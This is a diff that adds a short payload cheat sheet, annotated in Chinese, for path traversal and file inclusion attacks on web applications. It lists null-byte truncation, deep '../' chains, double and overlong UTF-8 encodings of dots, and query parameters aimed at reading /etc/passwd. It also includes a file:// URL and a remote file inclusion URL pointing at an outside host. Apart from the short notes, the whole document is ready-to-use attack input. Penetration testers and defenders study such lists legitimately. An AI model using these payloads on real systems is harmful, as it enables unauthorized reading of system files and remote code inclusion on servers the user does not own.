@@ -1,0 +1,15 @@
+1、配合截断规则：/etc/passwd%00.jpg
+2、../../../../../../../../../../etc/passwd%00.jpg
+3、%252e -> %2e -> .
+4、%c0%ae 解析为 '\uC0AE'，最后转义为 "."  #JAVA端
+5、%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=downLoad
+    5.1 ../
+    5.2 ..%2F
+    5.3 /%c0%ae%c0%ae/
+    5.4 %2e%2e%2f
+6、?file=../../../../etc/passwd
+   ?page=file:///etc/passwd
+   ?home=main.cgi
+   ?page=http://www.a.com/1.php     //远程文件包含
+   http://1.1.1.1/../../../dir/file.txt
+
